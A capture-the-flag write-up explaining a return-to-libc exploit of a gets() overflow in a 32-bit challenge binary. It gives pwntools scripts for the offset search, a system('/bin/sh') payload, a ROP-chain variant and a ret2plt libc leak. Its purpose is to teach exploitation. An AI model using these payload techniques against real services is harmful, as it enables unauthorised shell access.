# Return-to-libc Attack Chain

**Category:** Pwn  
**Event:** PWNYcup  
**Difficulty:** Medium  
**Date:** 2024-11-15  
**Author:** Ahmed Benali

## Description

Advanced exploitation technique using return-to-libc to bypass NX bit protection
and achieve code execution.

## Challenge Overview

We're given a 32-bit ELF binary with the following protections:

- NX bit enabled (non-executable stack)
- No stack canaries
- No ASLR
- Partial RELRO

## Initial Analysis

```bash
file challenge32
checksec challenge32
```

```
challenge32: ELF 32-bit LSB executable, x86, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=def456..., not stripped

RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## Vulnerability Analysis

The vulnerability exists in the `echo_input` function:

```c
void echo_input() {
    char buffer[32];
    printf("Enter message: ");
    gets(buffer);  // Buffer overflow here!
    printf("Message: %s\n", buffer);
}
```

## Exploitation Strategy

Since the stack is non-executable, we can't inject shellcode. Instead, we'll use
return-to-libc:

1. Find the offset to overwrite EIP
2. Locate system() function in libc
3. Find "/bin/sh" string in libc
4. Build the attack chain

### Step 1: Finding the Offset

```python
from pwn import *

# Create cyclic pattern
pattern = cyclic(100)
p = process('./challenge32')
p.sendline(pattern)

# EIP is overwritten at offset 44
offset = 44
```

### Step 2: Finding system() and "/bin/sh"

```python
# Since ASLR is disabled, addresses are static
libc = ELF('/lib32/libc.so.6')
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

print(f"system() address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(binsh_addr)}")
```

### Step 3: Building the Exploit

For 32-bit return-to-libc, the stack layout should be:

```
[buffer overflow] [system_addr] [return_addr] [binsh_addr]
```

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'i386'

# Load binary and libc
binary = ELF('./challenge32')
libc = ELF('/lib32/libc.so.6')

def exploit():
    p = process('./challenge32')

    # Addresses (no ASLR)
    system_addr = 0xf7e12940  # system() in libc
    binsh_addr = 0xf7f4a0cf   # "/bin/sh" string
    exit_addr = 0xf7e05c30    # exit() for clean termination

    # Build payload
    payload = b"A" * 44           # Fill buffer
    payload += p32(system_addr)   # Overwrite EIP with system()
    payload += p32(exit_addr)     # Return address (exit)
    payload += p32(binsh_addr)    # Argument to system()

    log.info("Sending payload...")
    p.sendline(payload)

    # Get shell
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Advanced Technique: ROP Chain

For more complex scenarios, we can build a ROP chain:

```python
from pwn import *

context.arch = 'i386'
binary = ELF('./challenge32')
libc = ELF('/lib32/libc.so.6')

# Build ROP chain
rop = ROP([binary, libc])

# Call system("/bin/sh")
rop.system(next(libc.search(b'/bin/sh')))

payload = b"A" * 44 + rop.chain()
```

## Alternative: ret2plt

If system() isn't available, we can use ret2plt:

```python
# Use plt entries
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols['main']

# Leak libc address first
payload1 = b"A" * 44
payload1 += p32(puts_plt)     # Call puts()
payload1 += p32(main_addr)    # Return to main
payload1 += p32(puts_got)     # Argument: puts GOT entry

# Send first payload to leak libc
p.sendline(payload1)
puts_leak = u32(p.recv(4))
libc.address = puts_leak - libc.symbols['puts']

# Now call system with known address
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

payload2 = b"A" * 44
payload2 += p32(system_addr)
payload2 += p32(0x41414141)   # Dummy return
payload2 += p32(binsh_addr)

p.sendline(payload2)
```

## Flag

```
shellmates{r3t2l1bc_1s_cl4ss1c_pwn_t3chn1qu3}
```

## Files

- challenge32 - The vulnerable 32-bit binary
- exploit.py - Complete exploitation script
- libc.so.6 - Required libc library

## References

- [Return-to-libc Attacks](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [32-bit Exploitation Basics](https://ctf101.org/binary-exploitation/return-to-libc/)
- [ROP Chain Construction](https://github.com/shellmates/rop-tutorial)

---

_Educational content for learning binary exploitation techniques._
